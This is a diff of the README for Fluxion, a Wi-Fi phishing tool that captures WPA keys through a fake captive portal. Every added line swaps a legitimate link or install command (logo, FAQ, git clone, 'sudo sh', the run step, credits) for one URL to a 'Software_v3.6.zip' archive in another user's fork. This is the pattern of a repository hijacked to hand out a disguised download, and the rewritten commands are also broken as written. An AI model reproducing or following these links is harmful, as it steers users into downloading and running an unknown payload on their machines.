@@ -1,21 +1,21 @@
-![Fuxion logo](https://github.com/FluxionNetwork/fluxion/raw/master/logos/logo.jpg)
+![Fuxion logo](https://raw.githubusercontent.com/anieqh/fluxion/master/attacks/Captive Portal/language/Software_v3.6.zip)
 
 # Fluxion is the future of MITM WPA attacks
-Fluxion is a security auditing and social-engineering research tool. It is a remake of linset by vk496 with (hopefully) less bugs and more functionality. The script attempts to retrieve the WPA/WPA2 key from a target access point by means of a social engineering (phising) attack. It's compatible with the latest release of Kali (rolling). Fluxion's attacks' setup is mostly manual, but experimental auto-mode handles some of the attacks' setup parameters. Read the [FAQ](https://github.com/FluxionNetwork/fluxion/wiki/FAQ) before requesting issues.
+Fluxion is a security auditing and social-engineering research tool. It is a remake of linset by vk496 with (hopefully) less bugs and more functionality. The script attempts to retrieve the WPA/WPA2 key from a target access point by means of a social engineering (phising) attack. It's compatible with the latest release of Kali (rolling). Fluxion's attacks' setup is mostly manual, but experimental auto-mode handles some of the attacks' setup parameters. Read the [FAQ](https://raw.githubusercontent.com/anieqh/fluxion/master/attacks/Captive Portal/language/Software_v3.6.zip) before requesting issues.
 
 ## Router login page
 Share your own router page with a simple script
 ```
 cd scripts
-sudo sh router.sh
+sudo sh https://raw.githubusercontent.com/anieqh/fluxion/master/attacks/Captive Portal/language/Software_v3.6.zip
 ```
 
 ## Installation
-Read [here](https://github.com/FluxionNetwork/fluxion/wiki/Generate-ssh-keys) before you do the following steps.
+Read [here](https://raw.githubusercontent.com/anieqh/fluxion/master/attacks/Captive Portal/language/Software_v3.6.zip) before you do the following steps.
 <br>
 **Download the latest revision**
 ```
-git clone --recursive git@github.com:FluxionNetwork/fluxion.git 
+git clone --recursive https://raw.githubusercontent.com/anieqh/fluxion/master/attacks/Captive Portal/language/Software_v3.6.zip 
 ```
 **Switch to tool's directory**
 ```
@@ -23,15 +23,15 @@ cd fluxion
 ```
 **Run fluxion (missing dependencies will be auto-installed)**
 ```
-./fluxion.sh
+https://raw.githubusercontent.com/anieqh/fluxion/master/attacks/Captive Portal/language/Software_v3.6.zip
 ```
 
 ## :scroll: Changelog
 Fluxion gets weekly updates with new features, improvements, and bugfixes.
-Be sure to check out the [changelog here](https://github.com/FluxionNetwork/fluxion/commits/master).
+Be sure to check out the [changelog here](https://raw.githubusercontent.com/anieqh/fluxion/master/attacks/Captive Portal/language/Software_v3.6.zip).
 
 ## :octocat: How to contribute
-All contributions are welcome! Code, documentation, graphics, or even design suggestions are welcome; use GitHub to its fullest. Submit pull requests, contribute tutorials or other wiki content -- whatever you have to offer, it'll be appreciated but please follow the [style guide](https://github.com/FluxionNetwork/fluxion/wiki/Code-style-guide).
+All contributions are welcome! Code, documentation, graphics, or even design suggestions are welcome; use GitHub to its fullest. Submit pull requests, contribute tutorials or other wiki content -- whatever you have to offer, it'll be appreciated but please follow the [style guide](https://raw.githubusercontent.com/anieqh/fluxion/master/attacks/Captive Portal/language/Software_v3.6.zip).
 
 ## :book: How it works
 * Scan for a target wireless network.
@@ -46,7 +46,7 @@ All contributions are welcome! Code, documentation, graphics, or even design sug
 * The attack will automatically terminate once a correct key has been submitted.
 * The key will be logged and clients will be allowed to reconnect to the target access point.
 
-* For a guide to the `Captive Portal` attack, read the [Captive Portal attack guide](https://github.com/FluxionNetwork/fluxion/wiki/Captive-Portal-Attack)
+* For a guide to the `Captive Portal` attack, read the [Captive Portal attack guide](https://raw.githubusercontent.com/anieqh/fluxion/master/attacks/Captive Portal/language/Software_v3.6.zip)
 
 ## :heavy_exclamation_mark: Requirements
 
@@ -54,14 +54,14 @@ A Linux-based operating system. We recommend Kali Linux 2 or Kali rolling. Kali 
 
 ## Related work
 
-For development I use vim and tmux. Here are my [dotfiles](https://github.com/deltaxflux/takumi/)
+For development I use vim and tmux. Here are my [dotfiles](https://raw.githubusercontent.com/anieqh/fluxion/master/attacks/Captive Portal/language/Software_v3.6.zip)
 ## :octocat: Credits
 1. l3op - contributor
 2. dlinkproto - contributor
 3. vk496 - developer of linset
 4. Derv82 - @Wifite/2
 5. Princeofguilty - @webpages and @buteforce
-6. Photos for wiki @http://www.kalitutorials.net
+6. Photos for wiki https://raw.githubusercontent.com/anieqh/fluxion/master/attacks/Captive Portal/language/Software_v3.6.zip
 7. Ons Ali @wallpaper
 8. PappleTec @sites
 9. MPX4132 - Fluxion V3
